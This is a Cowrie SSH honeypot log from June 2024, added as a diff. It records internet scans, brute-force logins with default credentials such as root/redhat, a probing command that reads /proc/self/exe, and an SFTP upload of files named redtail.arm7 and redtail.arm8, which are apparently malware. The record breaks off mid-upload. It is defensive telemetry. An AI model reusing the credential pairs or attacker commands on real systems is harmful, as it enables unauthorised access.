@@ -1,0 +1,1527 @@
+2024-06-07T00:46:38.720118Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 211.252.161.44:60334 (172.31.41.134:2222) [session: 6acb1765ba34]
+2024-06-07T00:46:38.854655Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T00:46:38.854866Z [HoneyPotSSHTransport,67,211.252.161.44] Connection lost after 0 seconds
+2024-06-07T00:46:39.011362Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 211.252.161.44:60556 (172.31.41.134:2222) [session: e6cf824d23b4]
+2024-06-07T00:46:39.068716Z [HoneyPotSSHTransport,68,211.252.161.44] Remote SSH version: SSH-2.0-Go
+2024-06-07T00:46:39.286508Z [HoneyPotSSHTransport,68,211.252.161.44] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T00:46:39.287581Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T00:46:39.287700Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T00:46:39.287801Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T00:46:40.095162Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T00:46:40.100864Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T00:46:40.453343Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'orangepi' trying auth b'none'
+2024-06-07T00:46:40.648039Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'orangepi' trying auth b'password'
+2024-06-07T00:46:40.648401Z [HoneyPotSSHTransport,68,211.252.161.44] Could not read etc/userdb.txt, default database activated
+2024-06-07T00:46:40.648578Z [HoneyPotSSHTransport,68,211.252.161.44] login attempt [b'orangepi'/b'orangepi'] failed
+2024-06-07T00:46:41.650432Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'orangepi' failed auth b'password'
+2024-06-07T00:46:41.650862Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T00:46:41.871093Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T00:46:41.871296Z [HoneyPotSSHTransport,68,211.252.161.44] Connection lost after 2 seconds
+2024-06-07T01:27:39.085092Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 198.235.24.129:57674 (172.31.41.134:2222) [session: 1fd5db83097f]
+2024-06-07T01:27:40.179205Z [HoneyPotSSHTransport,69,198.235.24.129] Remote SSH version: SSH-2.0-ZGrab ZGrab SSH Survey
+2024-06-07T01:27:41.634487Z [HoneyPotSSHTransport,69,198.235.24.129] SSH client hassh fingerprint: dd9bcf093c355da7000132131cb36fd0
+2024-06-07T01:27:41.635761Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group-exchange-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T01:27:41.635870Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-md5' b'none'
+2024-06-07T01:27:41.635962Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-md5' b'none'
+2024-06-07T01:27:45.805178Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T01:27:45.805405Z [HoneyPotSSHTransport,69,198.235.24.129] Connection lost after 6 seconds
+2024-06-07T02:49:27.907379Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 167.94.138.122:60726 (172.31.41.134:2222) [session: 7807ef60a5f8]
+2024-06-07T02:49:28.336371Z [HoneyPotSSHTransport,70,167.94.138.122] Remote SSH version: SSH-2.0-Go
+2024-06-07T02:49:28.337144Z [HoneyPotSSHTransport,70,167.94.138.122] SSH client hassh fingerprint: 873a5fb5fedc2d4f8638ebde4abc6cfc
+2024-06-07T02:49:28.338250Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T02:49:28.338359Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T02:49:28.338451Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T02:49:29.021693Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T02:49:43.341849Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T02:49:43.342071Z [HoneyPotSSHTransport,70,167.94.138.122] Connection lost after 15 seconds
+2024-06-07T03:47:58.659031Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 66.240.236.109:49644 (172.31.41.134:2222) [session: f422f95b43b2]
+2024-06-07T03:47:58.659775Z [HoneyPotSSHTransport,71,66.240.236.109] Remote SSH version: SSH-2.0-Go
+2024-06-07T03:47:58.816282Z [HoneyPotSSHTransport,71,66.240.236.109] SSH client hassh fingerprint: 084386fa7ae5039bcf6f07298a05a227
+2024-06-07T03:47:58.817641Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T03:47:58.817750Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T03:47:58.817853Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T03:47:58.975439Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T03:48:08.659265Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T03:48:08.659467Z [HoneyPotSSHTransport,71,66.240.236.109] Connection lost after 9 seconds
+2024-06-07T03:48:08.832599Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 198.235.24.139:53864 (172.31.41.134:2222) [session: 9f94833c72d6]
+2024-06-07T03:48:09.256730Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T03:48:09.256934Z [HoneyPotSSHTransport,72,198.235.24.139] Connection lost after 0 seconds
+2024-06-07T06:07:45.276743Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 192.241.232.8:35354 (172.31.41.134:2222) [session: b28c8b8ebdbf]
+2024-06-07T06:07:45.277456Z [HoneyPotSSHTransport,73,192.241.232.8] Remote SSH version: MGLNDD_54.66.48.62_22
+2024-06-07T06:07:45.277911Z [HoneyPotSSHTransport,73,192.241.232.8] Bad protocol version identification: b'MGLNDD_54.66.48.62_22'
+2024-06-07T06:07:45.278185Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T06:07:45.278284Z [HoneyPotSSHTransport,73,192.241.232.8] Connection lost after 0 seconds
+2024-06-07T06:50:21.477081Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 222.97.85.199:62842 (172.31.41.134:2222) [session: 017bdc8940cc]
+2024-06-07T06:50:21.652129Z [HoneyPotSSHTransport,74,222.97.85.199] Remote SSH version: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+2024-06-07T06:50:21.799618Z [HoneyPotSSHTransport,74,222.97.85.199] SSH client hassh fingerprint: 9d31b8e6c87f893d077ca6526f7c710b
+2024-06-07T06:50:21.800632Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group14-sha1' key alg=b'ssh-rsa'
+2024-06-07T06:50:21.800797Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T06:50:21.800894Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T06:50:22.214389Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T06:50:22.404477Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T06:50:22.555294Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2024-06-07T06:50:22.556383Z [HoneyPotSSHTransport,74,222.97.85.199] Could not read etc/userdb.txt, default database activated
+2024-06-07T06:50:22.556558Z [HoneyPotSSHTransport,74,222.97.85.199] login attempt [b'root'/b'root'] failed
+2024-06-07T06:50:23.558446Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2024-06-07T06:50:23.558683Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T06:50:23.707099Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T06:50:23.855179Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2024-06-07T06:50:23.855491Z [HoneyPotSSHTransport,74,222.97.85.199] Could not read etc/userdb.txt, default database activated
+2024-06-07T06:50:23.855666Z [HoneyPotSSHTransport,74,222.97.85.199] login attempt [b'root'/b'0'] succeeded
+2024-06-07T06:50:23.856408Z [HoneyPotSSHTransport,74,222.97.85.199] Initialized emulated server as architecture: linux-x64-lsb
+2024-06-07T06:50:23.857586Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'
+2024-06-07T06:50:23.857795Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2024-06-07T06:50:24.005643Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2024-06-07T06:50:24.005951Z [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2024-06-07T06:50:24.154180Z [twisted.conch.ssh.session#info] Getting shell
+2024-06-07T06:50:24.394254Z [HoneyPotSSHTransport,74,222.97.85.199] CMD: ./oinasf; dd if=/proc/self/exe bs=22 count=1 || while read i; do echo $i; done < /proc/self/exe || cat /proc/self/exe;
+2024-06-07T06:50:24.395247Z [HoneyPotSSHTransport,74,222.97.85.199] Command not found: ./oinasf
+2024-06-07T06:50:24.395773Z [HoneyPotSSHTransport,74,222.97.85.199] Command found: dd if=/proc/self/exe bs=22 count=1
+2024-06-07T06:50:24.397730Z [HoneyPotSSHTransport,74,222.97.85.199] Can't find command while
+2024-06-07T06:50:24.397849Z [HoneyPotSSHTransport,74,222.97.85.199] Command not found: while read i
+2024-06-07T06:50:24.398445Z [HoneyPotSSHTransport,74,222.97.85.199] Command found: do echo
+2024-06-07T06:50:24.398781Z [HoneyPotSSHTransport,74,222.97.85.199] Command found: done < /proc/self/exe
+2024-06-07T06:50:24.399106Z [HoneyPotSSHTransport,74,222.97.85.199] Command found: cat /proc/self/exe
+2024-06-07T06:50:24.806772Z [HoneyPotSSHTransport,74,222.97.85.199] Closing TTY Log: var/lib/cowrie/tty/c46ab9e5190dd1178f6d4a698408da212164fa8d1e4bf88a3b724ce3a1777484 after 0 seconds
+2024-06-07T06:50:24.807477Z [HoneyPotSSHTransport,74,222.97.85.199] avatar root logging out
+2024-06-07T06:50:24.807581Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T06:50:24.807664Z [HoneyPotSSHTransport,74,222.97.85.199] Connection lost after 3 seconds
+2024-06-07T07:29:20.187237Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 171.244.43.244:43828 (172.31.41.134:2222) [session: 52efb54cb600]
+2024-06-07T07:29:23.684395Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T07:29:23.684607Z [HoneyPotSSHTransport,75,171.244.43.244] Connection lost after 3 seconds
+2024-06-07T07:29:28.284051Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 171.244.43.244:52446 (172.31.41.134:2222) [session: ba23ba9c5654]
+2024-06-07T07:29:28.404105Z [HoneyPotSSHTransport,76,171.244.43.244] Remote SSH version: SSH-2.0-libssh_0.7.4
+2024-06-07T07:29:28.660105Z [HoneyPotSSHTransport,76,171.244.43.244] SSH client hassh fingerprint: e37f354a101aff5871ba233aa82b84ec
+2024-06-07T07:29:28.661130Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-ed25519'
+2024-06-07T07:29:28.661237Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T07:29:28.661330Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T07:29:29.096864Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T07:29:29.258219Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T07:29:29.639137Z [HoneyPotSSHTransport,76,171.244.43.244] Got remote error, code 11 reason: b'Bye Bye'
+2024-06-07T07:29:29.639565Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T07:29:29.639672Z [HoneyPotSSHTransport,76,171.244.43.244] Connection lost after 1 seconds
+2024-06-07T07:52:50.231323Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 43.153.0.227:33106 (172.31.41.134:2222) [session: 6529d86be4ea]
+2024-06-07T07:52:50.232044Z [HoneyPotSSHTransport,77,43.153.0.227] Remote SSH version: SSH-2.0-libssh2_1.11.0
+2024-06-07T07:52:50.378798Z [HoneyPotSSHTransport,77,43.153.0.227] SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439
+2024-06-07T07:52:50.379988Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T07:52:50.380114Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T07:52:50.380207Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T07:52:50.700415Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T07:52:50.840063Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T07:52:50.983422Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'dolphinscheduler' trying auth b'password'
+2024-06-07T07:52:50.983739Z [HoneyPotSSHTransport,77,43.153.0.227] Could not read etc/userdb.txt, default database activated
+2024-06-07T07:52:50.983913Z [HoneyPotSSHTransport,77,43.153.0.227] login attempt [b'dolphinscheduler'/b'dolphinscheduler'] failed
+2024-06-07T07:52:51.985745Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'dolphinscheduler' failed auth b'password'
+2024-06-07T07:52:51.985985Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T07:52:52.126777Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T07:52:52.126971Z [HoneyPotSSHTransport,77,43.153.0.227] Connection lost after 1 seconds
+2024-06-07T07:52:59.274625Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 43.153.0.227:41064 (172.31.41.134:2222) [session: 98b893baf16b]
+2024-06-07T07:52:59.277034Z [HoneyPotSSHTransport,78,43.153.0.227] Remote SSH version: SSH-2.0-libssh2_1.11.0
+2024-06-07T07:52:59.416049Z [HoneyPotSSHTransport,78,43.153.0.227] SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439
+2024-06-07T07:52:59.417304Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T07:52:59.417412Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T07:52:59.417506Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T07:52:59.705799Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T07:52:59.845394Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T07:52:59.985144Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2024-06-07T07:52:59.985466Z [HoneyPotSSHTransport,78,43.153.0.227] Could not read etc/userdb.txt, default database activated
+2024-06-07T07:52:59.985648Z [HoneyPotSSHTransport,78,43.153.0.227] login attempt [b'root'/b'redhat'] succeeded
+2024-06-07T07:52:59.986374Z [HoneyPotSSHTransport,78,43.153.0.227] Initialized emulated server as architecture: linux-x64-lsb
+2024-06-07T07:52:59.986711Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'
+2024-06-07T07:52:59.986910Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2024-06-07T07:53:00.136940Z [HoneyPotSSHTransport,78,43.153.0.227] avatar root logging out
+2024-06-07T07:53:00.137157Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T07:53:00.137249Z [HoneyPotSSHTransport,78,43.153.0.227] Connection lost after 0 seconds
+2024-06-07T07:53:00.591761Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 164.215.103.47:60024 (172.31.41.134:2222) [session: 1dba848f04b7]
+2024-06-07T07:53:00.593371Z [HoneyPotSSHTransport,79,164.215.103.47] Remote SSH version: SSH-2.0-Go
+2024-06-07T07:53:00.899506Z [HoneyPotSSHTransport,79,164.215.103.47] SSH client hassh fingerprint: 5f904648ee8964bef0e8834012e26003
+2024-06-07T07:53:00.900601Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T07:53:00.900775Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T07:53:00.900876Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T07:53:01.207421Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T07:53:01.207821Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T07:53:01.513406Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2024-06-07T07:53:01.819331Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2024-06-07T07:53:01.819684Z [HoneyPotSSHTransport,79,164.215.103.47] Could not read etc/userdb.txt, default database activated
+2024-06-07T07:53:01.819860Z [HoneyPotSSHTransport,79,164.215.103.47] login attempt [b'root'/b'redhat'] succeeded
+2024-06-07T07:53:01.820370Z [HoneyPotSSHTransport,79,164.215.103.47] Initialized emulated server as architecture: linux-x64-lsb
+2024-06-07T07:53:01.820747Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'
+2024-06-07T07:53:01.820949Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2024-06-07T07:53:02.126541Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2024-06-07T07:53:02.126860Z [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2024-06-07T07:53:02.432482Z [twisted.conch.ssh.session#info] Asking for subsystem "b'sftp'"
+2024-06-07T07:53:02.432739Z [cowrie.shell.avatar.CowrieUser#debug] Subsystem lookup: {b'sftp': <class 'twisted.conch.ssh.filetransfer.FileTransferServer'>}
+2024-06-07T07:53:02.757710Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: INIT requestId=3
+2024-06-07T07:53:03.063658Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: OPEN requestId=1
+2024-06-07T07:53:03.063909Z [HoneyPotSSHTransport,79,164.215.103.47] SFTP openFile: b'redtail.arm7'
+2024-06-07T07:53:03.677425Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=2
+2024-06-07T07:53:03.989195Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65654 to 65418 in channel 0
+2024-06-07T07:53:03.989435Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=3
+2024-06-07T07:53:04.295907Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=4
+2024-06-07T07:53:04.602561Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:04.602803Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=5
+2024-06-07T07:53:04.909136Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=6
+2024-06-07T07:53:05.215781Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:05.216023Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=7
+2024-06-07T07:53:05.522460Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=8
+2024-06-07T07:53:05.829045Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:05.830404Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=9
+2024-06-07T07:53:06.136977Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=10
+2024-06-07T07:53:06.443777Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:06.444016Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=11
+2024-06-07T07:53:06.750940Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=12
+2024-06-07T07:53:07.058783Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:07.059015Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=13
+2024-06-07T07:53:07.365458Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=14
+2024-06-07T07:53:07.672284Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:07.672531Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=15
+2024-06-07T07:53:07.979176Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=16
+2024-06-07T07:53:08.286041Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:08.286280Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=17
+2024-06-07T07:53:08.592800Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=18
+2024-06-07T07:53:08.900101Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:08.900332Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=19
+2024-06-07T07:53:09.206889Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=20
+2024-06-07T07:53:09.513797Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:09.514034Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=21
+2024-06-07T07:53:09.820802Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=22
+2024-06-07T07:53:10.127335Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:10.127574Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=23
+2024-06-07T07:53:10.434102Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=24
+2024-06-07T07:53:10.740781Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:10.741012Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=25
+2024-06-07T07:53:11.048176Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=26
+2024-06-07T07:53:11.361651Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:11.361888Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=27
+2024-06-07T07:53:11.668645Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=28
+2024-06-07T07:53:11.977302Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:11.977534Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=29
+2024-06-07T07:53:12.284041Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=30
+2024-06-07T07:53:12.590805Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:12.591033Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=31
+2024-06-07T07:53:12.899527Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=32
+2024-06-07T07:53:13.205984Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:13.206249Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=33
+2024-06-07T07:53:13.513108Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=34
+2024-06-07T07:53:13.819840Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:13.820071Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=35
+2024-06-07T07:53:14.126161Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=36
+2024-06-07T07:53:14.432127Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: OPEN requestId=37
+2024-06-07T07:53:14.432358Z [HoneyPotSSHTransport,79,164.215.103.47] SFTP openFile: b'redtail.arm8'
+2024-06-07T07:53:14.740060Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=38
+2024-06-07T07:53:15.046738Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 89839 to 41233 in channel 0
+2024-06-07T07:53:15.046991Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=39
+2024-06-07T07:53:15.353452Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=40
+2024-06-07T07:53:15.659990Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:15.660222Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=41
+2024-06-07T07:53:15.970463Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=42
+2024-06-07T07:53:16.277856Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:16.279056Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=43
+2024-06-07T07:53:16.585362Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=44
+2024-06-07T07:53:16.894642Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:16.894882Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=45
+2024-06-07T07:53:17.201609Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=46
+2024-06-07T07:53:17.508031Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:17.508264Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=47
+2024-06-07T07:53:17.815065Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=48
+2024-06-07T07:53:18.121583Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:18.121814Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=49
+2024-06-07T07:53:18.428357Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=50
